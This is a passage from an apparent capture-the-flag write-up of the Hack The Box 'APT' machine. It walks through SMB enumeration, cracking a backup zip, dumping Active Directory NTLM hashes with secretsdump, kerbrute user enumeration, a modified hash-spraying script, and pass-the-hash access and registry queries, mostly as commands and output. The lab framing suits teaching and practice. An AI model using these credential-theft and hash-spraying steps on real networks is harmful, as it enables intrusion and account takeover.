</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Gigantic Hosting <span class="p">|</span> Home
</span></span><span class="line"><span class="cl">88/tcp  open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-04-15 00:36:03Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">389/tcp open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:apt.htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-09-24T07:07:18
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2050-09-24T07:17:18
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: f677 c290 98c0 2ac5 <span class="m">8575</span> <span class="m">7060</span> 683d cdbc 5f86 5d45
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-04-15T00:38:57+00:00<span class="p">;</span> -1s from scanner time.
</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds Windows Server <span class="m">2016</span> Standard <span class="m">14393</span> microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
</span></span><span class="line"><span class="cl">464/tcp open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:apt.htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-09-24T07:07:18
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2050-09-24T07:17:18
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: f677 c290 98c0 2ac5 <span class="m">8575</span> <span class="m">7060</span> 683d cdbc 5f86 5d45
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-04-15T00:38:57+00:00<span class="p">;</span> -1s from scanner time.
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>4/14%Time<span class="o">=</span>60778A78%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
</span></span><span class="line"><span class="cl">SF:ersionBindReqTCP,20,<span class="s2">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x04bind\0\0\x10\0\x03&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows Server <span class="m">2016</span> Standard <span class="m">14393</span> <span class="o">(</span>Windows Server <span class="m">2016</span> Standard 6.3<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: apt
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: APT<span class="se">\x</span><span class="m">00</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Domain name: htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Forest name: htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FQDN: apt.htb.local
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2021-04-15T01:38:41+01:00
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: &lt;blank&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-04-15T00:38:39
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2021-04-14T16:50:06
</span></span></code></pre></div><p>I will take notes on:</p>
<ul>
<li>
<p>Domain name: <code>htb.local</code></p>
</li>
<li>
<p>FQDN: <code>apt.htb.local</code></p>
</li>
<li>
<p>Host: Windows Server 2016 Standard 14393</p>
</li>
</ul>
<p>On a full port scan, there is a WinRM listening on IPv6.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «rpc-enum» «10.10.14.72»
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> -6 -v <span class="s1">&#39;dead:beef::b885:d62a:d679:573f&#39;</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">53/tcp    open  domain
</span></span><span class="line"><span class="cl">80/tcp    open  http
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
</span></span><span class="line"><span class="cl">389/tcp   open  ldap
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap
</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl
</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP
</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl
</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="tcp-445---smb-ipv6">TCP 445 - SMB (IPv6)</h3>
<p>Anonymous access is allowed on SMB. The <code>backup</code> share seems interesting here, so I will dig into that share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //apt 
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">        backup          Disk      
</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
</span></span><span class="line"><span class="cl">        NETLOGON        Disk      Logon server share 
</span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share 
</span></span><span class="line"><span class="cl">apt is an IPv6 address -- no workgroup available
</span></span></code></pre></div><p>In the <code>backup</code> share, there is a file called<code>backup.zip</code> . I will download it to my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ smbclient -N //apt/backup
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Thu Sep <span class="m">24</span> 03:30:52 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Thu Sep <span class="m">24</span> 03:30:52 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  backup.zip                          A <span class="m">10650961</span>  Thu Sep <span class="m">24</span> 03:30:32 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">10357247</span> blocks of size 4096. <span class="m">6964173</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get backup.zip 
</span></span><span class="line"><span class="cl">getting file <span class="se">\b</span>ackup.zip of size <span class="m">10650961</span> as backup.zip <span class="o">(</span>502.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 502.9 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><h4 id="zip-crack">Zip Crack</h4>
<p>The backup file is protected with a password. So I will use <code>zip2john.py</code> to convert this <code>backup.zip</code> into crackable hash format,  and then transfer the hash onto my Windows for cracking.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ zip2john backup.zip &gt; backup.zip.hash
</span></span><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ cat backup.zip.hash 
</span></span><span class="line"><span class="cl">backup.zip:<span class="nv">$pkzip2$3</span>*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip
</span></span></code></pre></div><p><code>Jtr</code> recovers the password of the backup file to <code>iloveyousomuch</code>. Now I can unzip the backup file using this password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\t</span>ools<span class="se">\j</span>ohn<span class="se">\r</span>un&gt; ./john.exe hashes/backup.zip.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">iloveyousomuch   <span class="o">(</span>backup.zip<span class="o">)</span>
</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2021-04-15 08:29<span class="o">)</span> 35.71g/s 585142p/s 585142c/s 585142C/s 123456..christal
</span></span></code></pre></div><p>This backup contains AD database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── Active Directory
</span></span><span class="line"><span class="cl">│   ├── ntds.dit
</span></span><span class="line"><span class="cl">│   └── ntds.jfm
</span></span><span class="line"><span class="cl">└── registry
</span></span><span class="line"><span class="cl">    ├── SECURITY
</span></span><span class="line"><span class="cl">    └── SYSTEM
</span></span></code></pre></div><h4 id="dumping-ntlm-hashes">Dumping NTLM Hashes</h4>
<p><code>ntds.dit</code> is a database file for Active Directory environment, I can supply the <code>SECURITY</code> and <code>SYSTEM</code> files to <code>secretsdump.py</code> to extract all the AD users&rsquo; NTLM hash.</p>
<blockquote>
<p>NTDS stands for New Technology Directory Service and DIT stands for directory information tree.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ secretsdump.py -ntds Active<span class="se">\ </span>Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL &gt; ad_hashes
</span></span></code></pre></div><p>I saved the hash to a file called <code>ad_hashes</code>.</p>
<h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
<h4 id="finding-valid-usernames">Finding Valid Usernames</h4>
<p>Because there are so many data to try, I might accidentally get locked out if I do password spray blindly. Luckily, there is a tool called <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> that can determine which users are valid based on the Kerberos pre-auth responses; If the user is a valid user, KDC returns <code>UF_DONT_REQUIRE_PREAUTH</code>. If it’s not, it returns <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>.</p>
<p>Before that, I&rsquo;ll pull the users and NTLM hash from <code>ad_hashes</code> and store them in separate list. I&rsquo;ll feed <code>users.list</code> to <code>kerbrute</code>.</p>
<p><code>users.list</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ cat ad_hashes <span class="p">|</span> grep <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span> <span class="p">|</span> cut -d : -f1 &gt; ../users.list
</span></span></code></pre></div><p><code>userhash.list</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ cat ad_hashes <span class="p">|</span> grep <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span> <span class="p">|</span> cut -d : -f4 &gt; ../userhash.list
</span></span></code></pre></div><p>I ran <code>kerbrute</code>, and after some time, it returned three legitimate users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ kerbrute userenum  --dc apt --domain htb.local users.list
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">2021/04/14 22:02:35 &gt;  Using KDC<span class="o">(</span>s<span class="o">)</span>:
</span></span><span class="line"><span class="cl">2021/04/14 22:02:35 &gt;   apt:88
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2021/04/14 22:03:12 &gt;  <span class="o">[</span>+<span class="o">]</span> VALID USERNAME:       APT<span class="nv">$@</span>htb.local
</span></span><span class="line"><span class="cl">2021/04/14 22:03:12 &gt;  <span class="o">[</span>+<span class="o">]</span> VALID USERNAME:       Administrator@htb.local
</span></span><span class="line"><span class="cl">2021/04/14 22:07:31 &gt;  <span class="o">[</span>+<span class="o">]</span> VALID USERNAME:       henry.vinson@htb.local
</span></span><span class="line"><span class="cl">2021/04/14 22:15:52 &gt;  Done! Tested <span class="m">2001</span> usernames <span class="o">(</span><span class="m">3</span> valid<span class="o">)</span> in 796.320 second
</span></span></code></pre></div><p><code>APT$</code> is an account used for authentication purposes in the domain, it can not be used for interactive login into the system. Because of that, I&rsquo;ll only keep <code>administrator</code> and <code>henry.vinson</code> on the list of valid users. But if I have a valid NT hash of this account, that would be very useful as it can be used for DCSync attack.</p>
<h4 id="hash-brute-force">Hash Brute-force</h4>
<p>Using <code>henry.vinson:2de80758521541d19cabba480b260e8f</code> pair returns an authorization error message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72»
</span></span><span class="line"><span class="cl">$ evil-winrm -i apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Error: An error of <span class="nb">type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Error: Exiting with code <span class="m">1</span>
</span></span></code></pre></div><p>Another option here is to spray the NTLM hashes on <code>henry.vinson</code>. Unfortunately, <code>kerbrute</code> doesn&rsquo;t support pass-the-hash yet. But there is a Python version of <code>kerbrute</code> called <code>pyKerbrute</code> (If i&rsquo;m not mistaken, you can use <code>GetNPusers.py</code> from impacket as well). One of its tools called <code>ADPwdSpray.py</code> supports bruteforcing with hash.</p>
<ul>
<li><a href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/3gstudent/pyKerbrute.git
</span></span></code></pre></div><p>By default, it only supports a single hash, so I’ve modified it a bit to work with a list of hashes and IPv6.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">kdc_a</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># apt</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_realm</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="c1"># htb.local</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_name</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="c1"># henry.vinson, administrator</span>
</span></span><span class="line"><span class="cl">        <span class="n">hashes</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span> <span class="c1"># aad3...hashes</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] DomainControlerAddr: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">kdc_a</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] DomainName:          </span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">user_realm</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">user_hash</span> <span class="ow">in</span> <span class="n">hashes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        	<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">[*] Trying hash: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="p">(</span><span class="n">user_hash</span><span class="p">))</span> <span class="c1"># to make sure it checks every hash in list</span>
</span></span><span class="line"><span class="cl">        	<span class="n">user_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">RC4_HMAC</span><span class="p">,</span> <span class="n">user_hash</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        	<span class="n">passwordspray_tcp</span><span class="p">(</span><span class="n">user_realm</span><span class="p">,</span> <span class="n">user_name</span><span class="p">,</span> <span class="n">user_key</span><span class="p">,</span> <span class="n">kdc_a</span><span class="p">,</span> <span class="n">user_hash</span><span class="p">)</span>
</span></span></code></pre></div><p>After a few minutes, it returns one valid hash that works on <code>henry.vinson</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «pyKerbrute» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ wc -c ../userhash.list 
</span></span><span class="line"><span class="cl"><span class="m">66001</span> userhash.list
</span></span><span class="line"><span class="cl">→ root@iamf «pyKerbrute» «10.10.14.72» git:<span class="o">(</span>temp<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ python ADPwdSpray.py apt htb.local <span class="s1">&#39;henry.vinson&#39;</span> ../userhash.list <span class="p">|</span> tee ../pykerbrute-spray
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> DomainControlerAddr: apt
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> DomainName:          HTB.LOCAL
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-henryvinson_adm">Shell as henry.vinson_adm</h3>
<h4 id="forwarding-ipv4---ipv6">Forwarding IPv4 -&gt; IPv6</h4>
<p>Here, a relay or a port forwarding is required to make some tools work on IPv6. There are two solutions for this:</p>
<p>First, use socat.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ socat tcp-listen:445,fork tcp6:apt:445
</span></span></code></pre></div><p>Second, use ssh.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ ssh -L 445:apt:445 root@localhost -Nf
</span></span><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ netstat -tlpn
</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:445           0.0.0.0:*               LISTEN      8548/ssh            
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      8087/sshd: /usr/sbin 
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::1:445                 :::*                    LISTEN      8548/ssh 
</span></span></code></pre></div><p>I can confirm both forwarding options work by authenticating to SMB using <code>henry.vinson</code> creds to localhost using <code>crackmapexec</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb localhost -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb 
</span></span><span class="line"><span class="cl">SMB         127.0.0.1       <span class="m">445</span>    APT              <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2016</span> Standard <span class="m">14393</span> <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         127.0.0.1       <span class="m">445</span>    APT              <span class="o">[</span>+<span class="o">]</span> htb.local<span class="se">\h</span>enry.vinson e53d87d42adaa3ca32bdb34a876cbffb 
</span></span></code></pre></div><h4 id="registry-enumeration">Registry Enumeration</h4>
<p><code>henry.vinson</code> can not be used to login remotely into the box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i apt -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Error: An error of <span class="nb">type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Error: Exiting with code <span class="m">1</span>
</span></span></code></pre></div><p>But,  using <code>reg.py</code> from Impacket, it can be used to to query to the Windows registry, specifically the user registry.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ reg.py htb.local/henry.vinson@apt -hashes <span class="s1">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU
</span></span><span class="line"><span class="cl">Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Cannot check RemoteRegistry status. Hoping it is started...
</span></span><span class="line"><span class="cl">HKU
</span></span><span class="line"><span class="cl">HKU<span class="se">\C</span>onsole
</span></span><span class="line"><span class="cl">HKU<span class="se">\C</span>ontrol Panel
</span></span><span class="line"><span class="cl">HKU<span class="se">\E</span>nvironment
</span></span><span class="line"><span class="cl">HKU<span class="se">\K</span>eyboard Layout
</span></span><span class="line"><span class="cl">HKU<span class="se">\N</span>etwork
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>ystem
</span></span><span class="line"><span class="cl">HKU<span class="se">\V</span>olatile Environment
</span></span></code></pre></div><p>On <code>HKU\Software</code> there is a registry key called <code>GiganticHostingManagementSystem</code>. This is the name of the hosted website.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ reg.py htb.local/henry.vinson@apt -hashes <span class="s1">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU<span class="se">\\</span>Software   
</span></span><span class="line"><span class="cl">Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Cannot check RemoteRegistry status. Hoping it is started...
